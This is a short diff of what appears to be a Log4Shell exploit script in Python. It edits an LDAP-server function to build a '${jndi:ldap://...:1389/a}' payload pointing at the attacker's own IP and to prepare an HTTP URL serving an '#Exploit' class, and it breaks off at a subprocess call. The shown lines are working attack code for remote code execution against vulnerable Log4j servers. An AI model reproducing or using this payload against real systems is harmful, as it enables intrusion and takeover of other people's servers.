@@ -91,8 +91,8 @@ def check_java() -> bool:
 
 
 def ldap_server(userip: str, lport: int) -> None:
-    sendme = "Exploit Port:1389" % (userip)
-    print(Fore.GREEN + f"[+] 送信: {sendme}\n")
+    sendme = "${jndi:ldap://%s:1389/a}" % (userip)
+    print(Fore.GREEN + f"[+] Send me Exploit Port:1389\n")
 
     url = "http://{}:{}/#Exploit".format(userip, lport)
     subprocess.run([
